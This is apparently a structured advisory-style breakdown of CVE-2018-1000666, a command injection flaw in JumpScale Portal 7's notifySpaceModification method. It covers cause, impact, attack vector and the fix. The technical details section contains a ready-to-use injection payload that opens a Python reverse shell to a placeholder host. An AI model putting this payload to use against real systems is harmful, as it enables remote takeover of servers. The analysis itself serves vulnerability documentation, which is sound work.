Based on the provided content, here's a breakdown of the vulnerability associated with CVE-2018-1000666:

**Root Cause of Vulnerability:**

*   The vulnerability stems from a flaw in the `notifySpaceModification` method within the JumpScale Portal 7. Specifically, the `owner` field in this method isn't properly sanitized before being used in a command execution.

**Weaknesses/Vulnerabilities Present:**

*   **Command Injection:** The primary vulnerability is a command injection. The `owner` field is directly incorporated into a shell command: `cmd="cd /opt/code/%s/%s;hg pull;hg update -C"%(owner,name)`.  By crafting a malicious `owner` string, an attacker can inject arbitrary shell commands into the execution flow.

**Impact of Exploitation:**

*   **Remote Code Execution (RCE):** A successful exploit allows an attacker to execute arbitrary commands on the server hosting the JumpScale Portal 7 instance. This level of access can lead to complete system compromise.
*   **Reverse Shell:** The provided example from the GitHub issue demonstrates how an attacker can establish a reverse shell to gain interactive control over the compromised system.

**Attack Vectors:**

*   **HTTP Request:** The attack vector involves sending a malicious HTTP request to the vulnerable `notifySpaceModification` method. The malicious payload would be in the `owner` field of the request.

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs to have network access to the JumpScale Portal 7 instance.
*   **Knowledge of API:** The attacker needs to be aware of the `notifySpaceModification` method and the vulnerable `owner` field.

**Technical Details:**

*   **Vulnerable Code Location:** The vulnerability exists in the following file: `jumpscale_portal/apps/portalbase/system/system__contentmanager/methodclass/system_contentmanager.py`, specifically within the `notifySpaceModification` method (lines 293-315).
*   **Exploit Payload:** The attacker crafts a malicious `owner` string using a command injection payload such as `;{cmd}#`. For example, to execute a reverse shell: `;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("a.b.c.d",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'#`

**Mitigation:**

*   The vulnerability was fixed by removing the vulnerable method (`notifySpaceModification`).
